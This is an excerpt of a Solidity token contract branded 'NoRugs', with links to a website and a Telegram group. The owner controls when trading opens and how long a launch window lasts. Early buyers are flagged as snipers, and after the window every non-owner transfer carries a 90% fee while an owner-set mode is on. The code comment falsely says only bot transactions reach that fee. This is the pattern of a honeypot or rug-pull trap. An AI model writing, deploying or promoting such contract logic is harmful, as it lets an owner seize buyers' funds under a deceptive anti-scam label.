...
https://www.norugs.org
https://t.me/NoRugsEntryPortal
...
contract NoRugs is Context, IERC20, Ownable {
    ...
    string private constant _symbol = "NORUGS";
    ...
    function openTrading(bool _status,uint256 _slipNonce) external onlyOwner() {
        tradingOpen = _status;
        excludeFromReward(address(this));
        excludeFromReward(uniswapV2Pair);
        if(tradingOpen && launchedAt == 0){
            launchedAt = block.number;
            slipNonce = _slipNonce;
        }
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(launchedAt>0 && (launchedAt + slipNonce) > block.number){
            _isSniper[to]=true;
        }
        
        //Punish high slippage bots for next - only bot txns go through here
        if(launchedAt>0 && from!= owner() && block.number >= (launchedAt + slipNonce)  && antiBotmode){
            _liquidityFee=90;    //90%
        }
